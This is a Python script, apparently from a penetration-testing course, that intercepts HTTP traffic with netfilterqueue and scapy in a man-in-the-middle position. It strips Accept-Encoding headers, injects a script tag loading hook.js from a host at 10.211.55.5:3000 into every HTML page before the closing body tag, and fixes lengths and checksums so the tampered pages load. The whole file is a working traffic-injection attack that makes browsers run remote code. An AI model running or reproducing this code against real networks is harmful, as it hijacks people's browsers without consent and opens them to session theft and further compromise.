#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re

"""Function to modify packets load page va
   Also format strings such as len and chksum
   that check if the packet was changed"""


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    # Converting packet into scapy packet
    # get_payload() - to get more info from packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # Finding fields, deliver port
        """
        Cover everything into try-except to avoid
        problems with converting inconvertible bytes 
        in packets.
        """
        try:
            # Get value of load field in packet
            load = scapy_packet[scapy.Raw].load.decode()
            # Send http request prot 80
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request")
                # Delete Accept-Encoding field to get html code in packet
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                # Code that we want to inject into our requested page
                # <script src="http://10.211.55.5:3000/hook.js"></script>
                injection_code = '<script src="http://10.211.55.5:3000/hook.js"></script>'
                load = str(load).replace("</body>", injection_code + "\n</body>")
                """
                Get info about a length of the requested packet
                to modify it and add more len that depends on
                our injected code to avoid error that refuse 
                to load more info in page if len-num are not equal.
                """
                content_len_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_len_search and "text/html" in load:
                    content_len = content_len_search.group(1)
                    new_content_len = int(content_len) + len(injection_code)
                    load = load.replace(content_len, str(new_content_len))
            """
            If there were changes in load field,
            we create new packet and send our load,
            Otherwise we do not touch this packets.
            """
            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass



    # Allow to pass packets through us
    packet.accept()


# Creating queue to store packets there
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
